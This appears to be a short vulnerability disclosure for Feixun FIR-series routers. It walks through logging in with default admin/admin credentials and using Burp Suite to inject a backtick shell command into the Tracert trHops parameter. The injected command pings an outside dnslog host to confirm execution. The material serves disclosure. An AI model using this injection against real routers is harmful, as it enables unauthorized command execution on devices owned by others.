The FIR151B A2、FIR302E A2、FIR300B A2 and so on routers has remote command execution

1. Login feixun FIR151B A2 router by default password admin /admin

2. Find the system tool → system diagnosis → Tracert → IP address / domain name. There is remote command execution at Tracert
![image](https://user-images.githubusercontent.com/96364879/182759089-f95ec4e2-d5e6-4907-a037-8a5db691fb6a.png)

3. Enter the website IP at the IP address / domain name, for example: 8.8.8.8

4. Click Start diagnosis

5. Use burpsuite intercept and change trHops argument to 20\`ping -c 3 abcdef.r4y19h.dnslog.cn\`, forward this request
![image](https://user-images.githubusercontent.com/96364879/182764151-6c698b75-57cf-4419-8bd0-c6064a1fbd57.png)

6. See the dnslog results, The command has been executed successfully
![image](https://user-images.githubusercontent.com/96364879/182764276-d13fab74-97fe-4b25-8991-a014f437ea2d.png)
